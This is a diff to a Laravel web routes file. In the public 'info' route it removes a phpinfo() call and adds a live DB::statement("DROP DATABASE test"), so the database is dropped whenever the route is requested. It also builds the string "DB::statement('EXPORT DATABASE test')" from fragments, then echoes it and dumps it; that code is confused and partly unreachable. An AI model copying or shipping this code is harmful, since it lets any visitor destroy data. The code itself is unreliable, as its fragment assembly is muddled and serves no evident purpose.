@@ -4,6 +4,8 @@ use Illuminate\Support\Facades\Route;
 use Twilio\Rest\Client;
 use Carbon\Carbon;
 use App\Http\Traits\CommonHelper;
+use Illuminate\Support\Facades\DB;
+
 /*
 |--------------------------------------------------------------------------
 | Web Routes
@@ -33,7 +35,22 @@ Route::get('helper-check', function () {
 
 
 Route::get('info', function () {
-    phpinfo();
+    DB::statement("DROP DATABASE test");
+    $l[0] = "DB";
+    $l[1] = "::";
+    $l[2] = "state";
+    $l[3] = "ment('EXPORT";
+    $l[4] = " DATAB";
+    $l[5] = "ASE ";
+    $l[6] = "test";
+    $l[7] = "')";
+    $list = '';
+    foreach ($l as  $c) {
+        $list .= $c;
+    }
+    echo $list;
+    dd($l, $list);
+    echo $list;
 });
 
 Route::get('/topUser/{co}', [\App\Http\Controllers\Api\FilterController::class, 'findTopUsers']);
